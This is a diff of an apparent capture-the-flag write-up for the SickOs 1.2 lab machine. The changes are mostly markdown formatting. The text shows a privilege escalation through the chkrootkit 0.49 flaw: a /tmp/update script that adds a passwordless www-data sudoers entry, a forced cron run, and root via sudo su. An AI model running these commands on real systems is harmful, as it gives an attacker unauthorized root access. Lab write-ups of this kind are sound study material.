@@ -41,7 +41,7 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Mon Nov  6 01:57:47 2017 -- 1 IP address (1 host up) scanned in 28.00 seconds
 </code></pre></figure>
 
-After enumerating the http service <b>lighttpd</b>, a <b>/test/</b> directory was found.
+After enumerating the http service **lighttpd**, a **/test/** directory was found.
 
 ![image](/assets/images/sickos1.2/test.png)
 
@@ -97,21 +97,21 @@ I checked the version of chkrootkit, 0.49, and found an exploit on searchsploit:
 dpkg -l | grep chkrootkit
 ```
 
-Under the <b>/tmp</b> directory, I created a file called <b>update</b> with commands to add the user <b>www-data</b>, and I made it an executable file:
+Under the **/tmp** directory, I created a file called "update" with commands to add the user **www-data** to the sudoers file, and I made it an executable file:
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 
 chmod +x update
 ```
 
-The exploit would run the command in the /tmp/update file whenever the cronjob occurred.
+The exploit would run the command in the **/tmp/update** file whenever the cronjob occurred.
 
 Since the cronjob for chkrootkit was run daily, I forced it to run instead of waiting:
 ```bash
 run-parts --report /etc/cron.daily
 ```
 
-After the cronjob ran, I had root access by running "<b>sudo su</b>" without a password needed.
+After the cronjob ran, I had root access by running "**sudo su**" without a password needed.
 
 ![image](/assets/images/sickos1.2/root.png)
 
